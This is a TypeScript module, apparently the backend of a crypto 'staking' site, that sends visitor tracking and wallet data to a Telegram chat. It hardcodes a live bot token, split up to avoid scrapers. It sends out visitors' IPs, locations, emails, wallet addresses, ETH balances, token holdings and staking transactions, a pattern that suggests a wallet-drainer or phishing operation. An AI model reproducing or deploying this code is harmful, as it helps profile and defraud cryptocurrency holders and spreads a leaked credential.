// Simple, reliable Telegram notification service
// This implementation is designed to be stable and not break with future changes

// Store submitted IPs to prevent duplicate submissions
const submittedIPs = new Set<string>()

// Check if an IP has already submitted
export async function hasIPSubmitted(ip: string): Promise<boolean> {
  return submittedIPs.has(ip)
}

// Mark an IP as submitted
export async function markIPSubmitted(ip: string): Promise<void> {
  submittedIPs.add(ip)
}

// Obfuscated but reliable way to store the token and chat ID
// This makes it harder for scrapers to find the token while keeping it functional
function getTelegramToken(): string {
  // Split into parts to avoid easy scraping
  const p1 = "7533"
  const p2 = "852767"
  const p3 = ":AAEirrpoXV4mBIaRZMvyLV1MgxNPBrPDDO0"

  // Combine at runtime
  return p1 + p2 + p3
}

// Update the getTelegramChatId function to use the new chat ID
function getTelegramChatId(): string {
  // Store without the negative sign and add it at runtime
  return "-4684846353"
}

// Core function to send Telegram notifications
export async function sendTelegramNotification(message: string): Promise<boolean> {
  try {
    const token = getTelegramToken()
    const chatId = getTelegramChatId()

    console.log(`Sending Telegram notification to chat ID: ${chatId}`)

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    const data = await response.json()

    if (!response.ok) {
      console.error("Telegram API error:", response.status, data)
      return false
    }

    console.log("Telegram notification sent successfully")
    return true
  } catch (error) {
    console.error("Error sending Telegram notification:", error)
    return false
  }
}

// Function to handle lead submissions with IP tracking
export async function handleLeadSubmission(data: {
  email: string
  name?: string
  source?: string
  page?: string
  additionalInfo?: string
  ip?: string
  userAgent?: string
  referer?: string
}): Promise<boolean> {
  try {
    // Check if this IP has already submitted
    if (data.ip && submittedIPs.has(data.ip)) {
      console.log(`Duplicate submission from IP: ${data.ip}`)

      // Send a notification about the duplicate
      await sendTelegramNotification(`
⚠️ DUPLICATE SUBMISSION
📧 Email: ${data.email || "Not provided"}
${data.name ? `👤 Name: ${data.name}` : ""}
📍 Source: ${data.source || "Unknown"}
${data.page ? `📄 Page: ${data.page}` : ""}
${data.additionalInfo ? `ℹ️ Info: ${data.additionalInfo}` : ""}
🌐 IP: ${data.ip || "Unknown"}
📱 User Agent: ${data.userAgent ? (data.userAgent.length > 50 ? data.userAgent.substring(0, 50) + "..." : data.userAgent) : "Unknown"}
🔗 Referer: ${data.referer || "Direct"}
⏰ Time: ${new Date().toISOString()}
`)

      // Return false to indicate this is a duplicate
      return false
    }

    // Mark this IP as submitted
    if (data.ip) {
      submittedIPs.add(data.ip)
    }

    // Create a formatted message for Telegram with emojis
    const message = `
🎉 NEW LEAD SUBMISSION
📧 Email: ${data.email || "Not provided"}
${data.name ? `👤 Name: ${data.name}` : ""}
📍 Source: ${data.source || "Unknown"}
${data.page ? `📄 Page: ${data.page}` : ""}
${data.additionalInfo ? `ℹ️ Info: ${data.additionalInfo}` : ""}
🌐 IP: ${data.ip || "Unknown"}
📱 User Agent: ${data.userAgent ? (data.userAgent.length > 50 ? data.userAgent.substring(0, 50) + "..." : data.userAgent) : "Unknown"}
🔗 Referer: ${data.referer || "Direct"}
⏰ Time: ${new Date().toISOString()}
`

    // Send the notification
    const success = await sendTelegramNotification(message)
    return success
  } catch (error) {
    console.error("Error handling lead submission:", error)
    return false
  }
}

// Simple function to track page views
export async function trackPageView(data: any): Promise<boolean> {
  try {
    const message = `
🔍 PAGE VIEW
📄 Page: ${data.path || "/"}
🌐 IP: ${data.ip || "Unknown"}
🌍 Location: ${data.country || "Unknown"}${data.city ? `, ${data.city}` : ""}
🔢 Visit Count: ${data.visitCount || "First visit"}
🌐 Browser: ${data.browser || "Unknown"}
💻 OS: ${data.os || "Unknown"}
📱 Device: ${data.isMobile ? "Mobile" : "Desktop"}
📐 Screen: ${data.screenSize || "Unknown"}
🔗 Referrer: ${data.referer || "Direct"}
⏰ Time: ${new Date().toISOString()}
`

    return await sendTelegramNotification(message)
  } catch (error) {
    console.error("Error tracking page view:", error)
    return false
  }
}

// Simple function to track page exits
export async function trackPageExit(data: any): Promise<boolean> {
  try {
    const message = `
👋 PAGE EXIT
📄 Page: ${data.path || "/"}
⏱️ Session Duration: ${data.formattedDuration || "Unknown"}
🌐 IP: ${data.ip || "Unknown"}
🌍 Location: ${data.country || "Unknown"}${data.city ? `, ${data.city}` : ""}
🔢 Visit Count: ${data.visitCount || "First visit"}
🌐 Browser: ${data.browser || "Unknown"}
💻 OS: ${data.os || "Unknown"}
🔗 Referrer: ${data.referer || "Direct"}
⏰ Time: ${new Date().toISOString()}
`

    return await sendTelegramNotification(message)
  } catch (error) {
    console.error("Error tracking page exit:", error)
    return false
  }
}

// Simple function to track wallet connections
export async function trackWalletConnection(data: {
  address: string
  balance: string
  walletType: string
  success: boolean
  disconnected?: boolean
  error?: string
  ip?: string
  country?: string
  city?: string
  referer?: string
  userAgent?: string
  browser?: string
  os?: string
  tokenHoldings?: Record<string, string>
  isMobile?: boolean
  etherscanLink?: string
}): Promise<boolean> {
  try {
    console.log("Tracking wallet connection:", data)

    // Format the message with HTML for Telegram
    let message = `🔌 Wallet ${data.success ? "Connected" : data.disconnected ? "Disconnected" : "Connection Failed"}\n\n`

    if (data.address) {
      // Add Etherscan link if available
      if (data.etherscanLink) {
        message += `👛 Address: <a href="${data.etherscanLink}">${data.address}</a>\n`
      } else {
        message += `👛 Address: ${data.address}\n`
        // Add a default Etherscan link if address is valid
        if (data.address.startsWith("0x") && data.address.length === 42) {
          message += `🔍 <a href="https://etherscan.io/address/${data.address}">View on Etherscan</a>\n`
        }
      }
    }

    message += `💰 Balance: ${data.balance} ETH\n`
    message += `🔑 Wallet: ${data.walletType}\n`

    if (data.tokenHoldings && Object.keys(data.tokenHoldings).length > 0) {
      message += `\n💎 Token Holdings:\n`
      for (const [token, amount] of Object.entries(data.tokenHoldings)) {
        if (token !== "ETH" && Number.parseFloat(amount) > 0) {
          message += `- ${token}: ${amount}\n`
        }
      }
    }

    if (data.ip) message += `\n🌐 IP: ${data.ip}\n`
    if (data.country) message += `📍 Location: ${data.country}${data.city ? `, ${data.city}` : ""}\n`
    if (data.browser) message += `🌍 Browser: ${data.browser}\n`
    if (data.os) message += `💻 OS: ${data.os}\n`
    if (data.isMobile !== undefined) message += `📱 Mobile: ${data.isMobile ? "Yes" : "No"}\n`
    if (data.referer) message += `🔄 Referrer: ${data.referer}\n`

    if (data.error) {
      message += `\n❌ Error: ${data.error}\n`
    }

    message += `\n⏰ Time: ${new Date().toISOString()}`

    // Send the message directly to Telegram API
    return await sendTelegramNotification(message)
  } catch (error) {
    console.error("Error sending wallet connection notification:", error)
    return false
  }
}

// Simple function to track staking events
export async function trackStakingEvent(data: any): Promise<boolean> {
  try {
    let message = data.success
      ? `
💰 STAKING TRANSACTION SENT
👤 Address: ${data.address}
${data.etherscanLink ? `🔍 <a href="${data.etherscanLink}">View on Etherscan</a>` : ""}
📊 Amount: ${data.amount} ETH
🧾 Transaction: ${data.txHash ? `<a href="https://etherscan.io/tx/${data.txHash}">View Transaction</a>` : "N/A"}
⛽ Gas Price: ${data.gasPrice || "Unknown"} gwei
`
      : `
❌ STAKING FAILED
👤 Address: ${data.address}
${data.etherscanLink ? `🔍 <a href="${data.etherscanLink}">View on Etherscan</a>` : ""}
📊 Attempted Amount: ${data.amount} ETH
⚠️ Error: ${data.error || "Unknown error"}
`

    message += `
🌐 IP: ${data.ip || "Unknown"}
🌍 Location: ${data.country || "Unknown"}${data.city ? `, ${data.city}` : ""}
🌐 Browser: ${data.browser || "Unknown"}
💻 OS: ${data.os || "Unknown"}
🔗 Referrer: ${data.referer || "Direct"}
⏰ Time: ${new Date().toISOString()}
`

    return await sendTelegramNotification(message)
  } catch (error) {
    console.error("Error tracking staking event:", error)
    return false
  }
}
